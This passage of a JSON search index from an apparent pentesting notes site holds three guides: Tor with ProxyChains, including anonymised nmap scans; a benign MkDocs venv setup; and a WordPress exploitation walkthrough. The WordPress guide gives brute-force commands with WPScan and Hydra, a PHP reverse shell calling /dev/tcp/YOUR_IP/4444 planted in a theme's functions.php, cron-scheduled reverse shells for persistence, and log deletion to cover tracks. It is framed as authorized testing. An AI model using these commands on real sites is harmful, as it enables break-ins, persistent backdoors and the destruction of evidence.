servers.</p>"},{"location":"torproxy/","title":"Connecting to Tor via Proxychains","text":""},{"location":"torproxy/#introduction","title":"Introduction","text":"<p>ProxyChains is a tool that routes network traffic through multiple proxies, including Tor, to anonymize connections. This guide covers how to configure ProxyChains and use it with Tor for enhanced privacy.</p> <p>Warning: While ProxyChains and Tor improve anonymity, they are not foolproof. Always follow best practices to avoid leaks.</p>"},{"location":"torproxy/#installing-tor-proxychains","title":"Installing Tor &amp; ProxyChains","text":""},{"location":"torproxy/#install-tor","title":"Install Tor","text":"<pre><code>sudo apt update &amp;&amp; sudo apt install tor -y\n</code></pre> <ul> <li>Tor routes your traffic through an encrypted onion network.</li> </ul>"},{"location":"torproxy/#install-proxychains","title":"Install ProxyChains","text":"<pre><code>sudo apt install proxychains\n</code></pre> <ul> <li>ProxyChains forces applications to route traffic through proxies (Tor, SOCKS, HTTP, etc.).</li> </ul>"},{"location":"torproxy/#configuring-proxychains","title":"Configuring ProxyChains","text":""},{"location":"torproxy/#edit-proxychains-configuration-file","title":"Edit ProxyChains Configuration File","text":"<pre><code>sudo nano /etc/proxychains.conf\n</code></pre> <ul> <li>Scroll to the bottom and ensure the following lines are set:</li> </ul>"},{"location":"torproxy/#important-configurations","title":"Important Configurations:","text":"<pre><code>strict_chain\nproxy_dns\nsocks5 127.0.0.1 9050  # Tor default SOCKS proxy\n</code></pre> <ul> <li><code>strict_chain</code> \u2192 Forces traffic through each proxy in the order listed.</li> <li><code>proxy_dns</code> \u2192 Prevents DNS leaks.</li> <li><code>socks5 127.0.0.1 9050</code> \u2192 Directs traffic through Tor\u2019s SOCKS5 proxy.</li> </ul>"},{"location":"torproxy/#save-exit","title":"Save &amp; Exit","text":"<ul> <li>Press CTRL + X, then Y, then ENTER to save the changes.</li> </ul>"},{"location":"torproxy/#starting-tor-using-proxychains","title":"Starting Tor &amp; Using ProxyChains","text":""},{"location":"torproxy/#start-the-tor-service","title":"Start the Tor Service","text":"<pre><code>sudo systemctl start tor\n</code></pre> <ul> <li>To enable Tor at boot:   <code>bash   sudo systemctl enable tor</code></li> <li>To check the status:   <code>bash   systemctl status tor</code></li> </ul>"},{"location":"torproxy/#running-applications-through-proxychains","title":"Running Applications Through ProxyChains","text":""},{"location":"torproxy/#check-ip-address-before-after","title":"Check IP Address Before &amp; After","text":"<pre><code>curl ifconfig.me\nproxychains curl ifconfig.me\n</code></pre> <ul> <li>The second command should return a Tor exit node IP.</li> </ul>"},{"location":"torproxy/#browse-anonymously-using-firefox","title":"Browse Anonymously Using Firefox","text":"<pre><code>proxychains firefox\n</code></pre>"},{"location":"torproxy/#run-nmap-through-tor-stealth-scan","title":"Run Nmap Through Tor (Stealth Scan)","text":"<pre><code>proxychains nmap -sT -Pn -n &lt;target&gt;\n</code></pre> <ul> <li><code>-sT</code> \u2192 TCP Connect Scan (Tor does not support SYN scans <code>-sS</code>).</li> <li><code>-Pn</code> \u2192 No Ping (Tor blocks ICMP requests).</li> <li><code>-n</code> \u2192 Disables DNS resolution (prevents leaks).</li> </ul>"},{"location":"torproxy/#additional-tips","title":"Additional Tips","text":"<ul> <li>Use <code>proxychains -q</code> to suppress ProxyChains logs.</li> <li>Combine with VPN for extra security.</li> <li>Modify exit nodes in <code>/etc/tor/torrc</code> for specific geolocations.</li> <li>Use bridges if Tor is blocked in your country.</li> </ul>"},{"location":"torproxy/#conclusion","title":"Conclusion","text":"<p>ProxyChains with Tor provides an extra layer of anonymity for web browsing, network scanning, and other activities. However, no system is 100% anonymous, so always use caution.</p>"},{"location":"venv/","title":"Setting Up a Virtual Environment for MkDocs","text":""},{"location":"venv/#introduction","title":"Introduction","text":"<p>Using a virtual environment (venv) for MkDocs ensures a clean, isolated workspace for documentation projects. This guide covers how to set up and manage a Python virtual environment for MkDocs.</p>"},{"location":"venv/#creating-a-virtual-environment","title":"Creating a Virtual Environment","text":"<p>To create a virtual environment named <code>mkdocs-venv</code>, run:</p> <pre><code>python3 -m venv mkdocs-venv\n</code></pre> <p>This will generate a virtual environment inside the <code>mkdocs-venv</code> directory.</p>"},{"location":"venv/#activating-the-virtual-environment","title":"Activating the Virtual Environment","text":"<p>After creating the virtual environment, activate it:</p> <pre><code>source mkdocs-venv/bin/activate\n</code></pre> <p>Once activated, your terminal prompt will change to indicate that the venv is active:</p> <pre><code>(mkdocs-venv) user@kali:~$\n</code></pre>"},{"location":"venv/#installing-mkdocs","title":"Installing MkDocs","text":"<p>With the virtual environment activated, install MkDocs:</p> <pre><code>pip install mkdocs\n</code></pre> <p>Verify the installation by checking the MkDocs version:</p> <pre><code>mkdocs --version\n</code></pre> <p>If the command returns a version number, MkDocs is successfully installed.</p>"},{"location":"venv/#deactivating-the-virtual-environment","title":"Deactivating the Virtual Environment","text":"<p>To exit the virtual environment, run:</p> <pre><code>deactivate\n</code></pre> <p>Your prompt should revert to the system default, indicating that the virtual environment is no longer active.</p>"},{"location":"venv/#best-practices","title":"Best Practices","text":"<ul> <li>Always activate the virtual environment before running MkDocs-related commands.</li> <li>Install additional MkDocs plugins and themes inside the virtual environment to avoid conflicts.</li> <li>Use <code>requirements.txt</code> to save dependencies for easy reinstallation:</li> </ul> <p><code>bash   pip freeze &gt; requirements.txt</code></p> <p>To reinstall dependencies later:</p> <p><code>bash   pip install -r requirements.txt</code></p>"},{"location":"venv/#conclusion","title":"Conclusion","text":"<p>Setting up a virtual environment for MkDocs helps maintain a clean Python workspace, preventing dependency conflicts. Following these steps ensures a smooth MkDocs experience.</p>"},{"location":"wpexplo/","title":"WordPress Exploitation Guide","text":""},{"location":"wpexplo/#introduction","title":"Introduction","text":"<p>WordPress is one of the most widely used CMS platforms, making it a common target for security testing. This guide covers enumeration, vulnerability scanning, and exploitation techniques using WPScan and other tools.</p> <p>Warning: This guide is for educational and authorized security testing only. Unauthorized access is illegal.</p>"},{"location":"wpexplo/#installing-wpscan","title":"Installing WPScan","text":"<p>WPScan is a WordPress security scanner used for enumerating users, plugins, themes, and vulnerabilities.</p>"},{"location":"wpexplo/#install-wpscan-on-linux","title":"Install WPScan on Linux","text":"<pre><code>sudo apt update &amp;&amp; sudo apt install wpscan -y\n</code></pre> <p>Or install using Ruby:</p> <pre><code>gem install wpscan\n</code></pre> <p>Verify installation:</p> <pre><code>wpscan --help\n</code></pre>"},{"location":"wpexplo/#enumerating-wordpress-information","title":"Enumerating WordPress Information","text":""},{"location":"wpexplo/#detect-wordpress-version","title":"Detect WordPress Version","text":"<pre><code>wpscan --url http://target.com --rua\n</code></pre> <ul> <li><code>--rua</code> \u2192 Random user-agent to avoid detection.</li> </ul>"},{"location":"wpexplo/#enumerate-wordpress-users","title":"Enumerate WordPress Users","text":"<pre><code>wpscan --url http://target.com -e u\n</code></pre> <ul> <li><code>-e u</code> \u2192 Enumerate users (useful for brute-force attacks).</li> </ul>"},{"location":"wpexplo/#enumerate-installed-plugins","title":"Enumerate Installed Plugins","text":"<pre><code>wpscan --url http://target.com -e p\n</code></pre> <ul> <li><code>-e p</code> \u2192 Enumerate plugins (check for vulnerable versions).</li> </ul>"},{"location":"wpexplo/#enumerate-themes","title":"Enumerate Themes","text":"<pre><code>wpscan --url http://target.com -e t\n</code></pre> <ul> <li><code>-e t</code> \u2192 Enumerate themes.</li> </ul>"},{"location":"wpexplo/#full-enumeration-scan","title":"Full Enumeration Scan","text":"<pre><code>wpscan --url http://target.com -e u,p,t --api-token YOUR_API_TOKEN\n</code></pre> <ul> <li>Using an API token enables checking against WPScan\u2019s vulnerability database.</li> </ul>"},{"location":"wpexplo/#brute-forcing-wordpress-logins","title":"Brute-Forcing WordPress Logins","text":""},{"location":"wpexplo/#using-wpscan-for-brute-force","title":"Using WPScan for Brute-Force","text":"<pre><code>wpscan --url http://target.com -U users.txt -P passwords.txt --max-threads 10\n</code></pre> <ul> <li><code>-U users.txt</code> \u2192 Uses a list of usernames.</li> <li><code>-P passwords.txt</code> \u2192 Uses a password list.</li> <li><code>--max-threads 10</code> \u2192 Uses 10 concurrent threads for speed.</li> </ul>"},{"location":"wpexplo/#using-hydra-for-brute-force","title":"Using Hydra for Brute-Force","text":"<pre><code>hydra -L users.txt -P passwords.txt http-post-form \\\n'wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:F=incorrect'\n</code></pre> <ul> <li><code>-L users.txt</code> \u2192 Username list.</li> <li><code>-P passwords.txt</code> \u2192 Password list.</li> <li>Customizes login request parameters for WordPress.</li> </ul>"},{"location":"wpexplo/#exploiting-vulnerabilities","title":"Exploiting Vulnerabilities","text":""},{"location":"wpexplo/#checking-for-known-vulnerabilities","title":"Checking for Known Vulnerabilities","text":"<p>Use WPScan to check for outdated versions and vulnerabilities:</p> <pre><code>wpscan --url http://target.com --api-token YOUR_API_TOKEN\n</code></pre> <ul> <li>Checks themes, plugins, and core version against vulnerability database.</li> </ul>"},{"location":"wpexplo/#searching-exploit-db-for-wordpress-exploits","title":"Searching Exploit-DB for WordPress Exploits","text":"<pre><code>searchsploit wordpress\n</code></pre> <ul> <li>Returns available exploits for WordPress and its plugins.</li> </ul>"},{"location":"wpexplo/#manually-checking-for-exposed-files","title":"Manually Checking for Exposed Files","text":"<pre><code>curl -s http://target.com/wp-config.php~\ncurl -s http://target.com/.git/\n</code></pre> <ul> <li>Some sites leave backup files and <code>.git</code> folders exposed.</li> </ul>"},{"location":"wpexplo/#uploading-a-malicious-plugin-or-theme","title":"Uploading a Malicious Plugin or Theme","text":"<p>If admin credentials are obtained, a backdoor can be uploaded using a malicious plugin.</p>"},{"location":"wpexplo/#uploading-a-web-shell-as-a-plugin","title":"Uploading a Web Shell as a Plugin","text":"<ol> <li>Create a zip file with a PHP shell inside <code>/wp-content/plugins/</code>.</li> <li>Upload it via the WordPress Admin Panel (<code>Appearance &gt; Plugins &gt; Add New</code>).</li> <li>Activate the plugin to execute the payload.</li> </ol>"},{"location":"wpexplo/#modifying-an-existing-theme","title":"Modifying an Existing Theme","text":"<ol> <li>Edit <code>functions.php</code> inside an installed theme.</li> <li>Add a PHP web shell:</li> </ol> <pre><code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1'\"); ?&gt;\n</code></pre> <ol> <li>Access the theme file in a browser to trigger the shell.</li> </ol>"},{"location":"wpexplo/#post-exploitation-steps","title":"Post-Exploitation Steps","text":""},{"location":"wpexplo/#maintaining-access","title":"Maintaining Access","text":"<ul> <li>Create a new admin user via SQL injection or shell access.</li> <li>Modify the wp-config.php to include persistent backdoors.</li> <li>Schedule reverse shells via cron jobs.</li> </ul>"},{"location":"wpexplo/#covering-tracks","title":"Covering Tracks","text":"<ul> <li>Delete logs: <code>rm -rf /var/log/apache2/*</code></li> <li>Clear history: <code>history -c</code></li> </ul>"},{"location":"wpexplo/#conclusion","title":"Conclusion","text":"<p>WordPress security testing involves enumeration, brute-force attacks, vulnerability exploitation, and post-exploitation persistence. Proper defenses include hardened login credentials, disabling unused plugins, and updating regularly.</p> <p>Test ethically and secure your WordPress sites properly.</p>"}]}